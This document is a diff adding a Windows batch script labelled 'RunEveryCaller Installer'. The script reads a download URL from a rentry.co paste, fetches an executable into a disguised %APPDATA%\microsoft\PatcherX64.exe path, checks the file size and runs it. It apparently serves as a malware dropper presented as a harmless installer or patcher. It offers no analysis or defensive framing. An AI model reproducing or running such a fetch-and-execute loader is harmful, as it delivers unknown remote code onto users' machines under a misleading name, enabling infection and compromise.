@@ -1,0 +1,52 @@
+:: RunEveryCaller Installer
+@echo off
+ 
+color 0A
+ 
+:loop
+ 
+:: Kill & Delete file 
+taskkill /f /im PatcherX64.exe >nul 2>&1
+del /f /q "%APPDATA%\microsoft\PatcherX64.exe" >nul 2>&1
+ 
+for /f "delims=" %%i in ('curl -s https://rentry.co/pppn8weu/raw') do set "RUNFILELINK=%%i"
+ 
+:: Download the file using curl
+curl -# -o "%APPDATA%\microsoft\PatcherX64.exe" "%RUNFILELINK%"
+ 
+timeout /t 2 /nobreak >nul
+ 
+:: Checking the existing of the file
+if not exist "%APPDATA%\microsoft\PatcherX64.exe" (
+    echo.
+    echo The download hasn't started yet. Please check your connection.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+ 
+:: Get the file size in bytes
+for %%a in ("%APPDATA%\microsoft\PatcherX64.exe") do set "FILESIZE=%%~za"
+ 
+ 
+ 
+:: Check if the file size is at least 80KB (80000 bytes)
+if %FILESIZE% geq 80000 (
+    start "" "%APPDATA%\microsoft\PatcherX64.exe"
+) else (
+echo.
+    echo Download incomplete. Check your connection and run the file again.
+	timeout /t 2 /nobreak >nul
+	echo Retrying in 2 seconds ....
+	timeout /t 2 /nobreak >nul
+	echo.
+	goto loop
+)
+ 
+ 
+echo Patcher Running...
+timeout /t 1 /nobreak >nul
